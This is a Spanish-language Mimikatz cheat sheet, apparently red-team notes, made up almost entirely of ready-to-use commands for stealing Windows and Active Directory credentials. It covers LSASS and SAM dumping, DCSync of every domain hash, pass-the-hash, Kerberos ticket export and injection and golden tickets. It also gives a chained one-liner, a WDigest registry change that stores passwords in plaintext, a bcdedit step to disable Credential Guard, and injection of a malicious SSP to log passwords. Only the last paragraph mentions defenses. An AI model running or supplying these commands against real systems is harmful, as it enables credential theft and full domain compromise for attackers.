# Mimikatz

## Comandos básicos
`privilege::debug`
- Eleva privilegios para acceder a procesos protegidos del sistema.

`token::elevate`
- Eleva el token del proceso actual a SYSTEM (si es posible).

`version`
- Muestra la versión de Mimikatz y detalles del sistema operativo.

## Dumpear creds
`sekurlsa::logonpasswords`
- Lista todas las sesiones activas y sus credenciales en memoria (incluye contraseñas y hashes).

`sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NTHASH /run:COMMAND`
- Inicia un proceso autenticado usando Pass the Hash.

`lsadump::sam`
- Extrae hashes NTLM y LM de cuentas locales desde el archivo SAM.

`lsadump::lsa /patch`
- Extrae secretos LSA del sistema, como contraseñas de servicios y claves de dominio.

`lsadump::dcsync /user:USERNAME`
- Simula una replicación de controlador de dominio (DCSync) para obtener hashes de un usuario específico.

`lsadump::dcsync /all /csv`
- Extrae hashes de todos los usuarios del dominio y los exporta en formato CSV.


## Intentar habilitar WDigest para almacenar credenciales en texto plano
- `reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f`
    - privilege::debug
    - sekurlsa::logonpasswords



## Kerberos

`kerberos::list /export`
- Lista los tickets Kerberos disponibles en memoria y los exporta a archivos .kirbi.

`kerberos::ptt FILE.kirbi`
- Inyecta un ticket Kerberos en la sesión actual.

`kerberos::golden`
- Genera un Golden Ticket para autenticarse como cualquier usuario en el dominio.

### Seguidilla de comandos al conseguir mimikatz recomendada
`.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache""sekurlsa::ekeys" "exit"`

## Windows Credential Guard

Windows Credential Guard es una característica de seguridad introducida por Microsoft para proteger credenciales sensibles almacenadas en memoria. Cuando está habilitada, el proceso LSASS (Local Security Authority Subsystem Service) utiliza un entorno aislado llamado LSAISO.exe (LSA Isolated) que opera en un nivel de confianza superior (VTL1) al del sistema operativo normal (VTL0). Esto significa que incluso con privilegios de SYSTEM, no se puede acceder directamente a las credenciales protegidas.

### Limitaciones de Mimikatz con Credential Guard
- **Usuarios no locales**: Credential Guard está diseñado para proteger credenciales de usuarios de dominio, mientras que las credenciales de usuarios locales aún pueden ser extraídas.
- **Credenciales cifradas**: Las credenciales de dominio almacenadas en LSASS están cifradas y no son accesibles directamente.

### Deshabilitar Credential Guard
Para deshabilitar Credential Guard y permitir que Mimikatz acceda a las credenciales en memoria:
1. Ejecutar `bcdedit /set hypervisorlaunchtype off` para deshabilitar el Hypervisor.
2. Reiniciar el sistema.

### Alternativa: Captura de credenciales en texto plano
Si no es posible deshabilitar Credential Guard, se puede usar el módulo `misc::memssp` de Mimikatz para interceptar credenciales en texto plano durante el inicio de sesión:
1. Inyectar el SSP malicioso con `misc::memssp`.
2. Esperar a que un usuario inicie sesión en el sistema.
3. Revisar el archivo de registro generado en `C:\Windows\System32\mimilsa.log` para obtener las credenciales capturadas.

### Consideraciones finales
Credential Guard es una mitigación efectiva contra ataques basados en credenciales, pero no es infalible. Los atacantes pueden recurrir a técnicas como la inyección de SSP para capturar credenciales en texto plano durante el inicio de sesión. Es importante implementar medidas adicionales, como el uso de autenticación multifactor y la segmentación de redes, para reducir el riesgo de compromisos.

